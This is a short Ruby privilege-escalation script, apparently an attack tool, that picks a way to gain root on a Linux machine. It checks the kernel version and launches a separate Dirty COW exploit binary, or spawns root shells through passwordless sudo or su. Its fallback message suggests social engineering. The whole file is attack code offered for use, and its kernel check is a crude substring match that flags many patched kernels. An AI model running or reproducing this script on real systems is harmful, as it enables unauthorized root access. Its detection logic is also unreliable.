class DirtyLinux
  def initialize
    @method = detect_method
  end

  def detect_method
    kernel_version = `uname -r`.strip
    puts "[*] Kernel Version: #{kernel_version}"

    if kernel_version.include?("4.") || kernel_version.include?("3.")
      return "dirtycow"
    elsif system("sudo -n true 2>/dev/null")
      return "sudo"
    elsif system("su -c 'echo root access' 2>/dev/null")
      return "su"
    else
      return "manual"
    end
  end

  def run
    case @method
    when "dirtycow"
      puts "[+] DirtyCow exploit in progress..."
      system("./dirtycow_exploit")
    when "sudo"
      puts "[+] Gaining root via sudo..."
      system("sudo -s")
    when "su"
      puts "[+] Attempting su root..."
      system("su root")
    else
      puts "[-] No automated method available. Try social engineering or kernel exploits."
    end
  end

  def show_options
    puts "Selected Method: #{@method}"
  end
end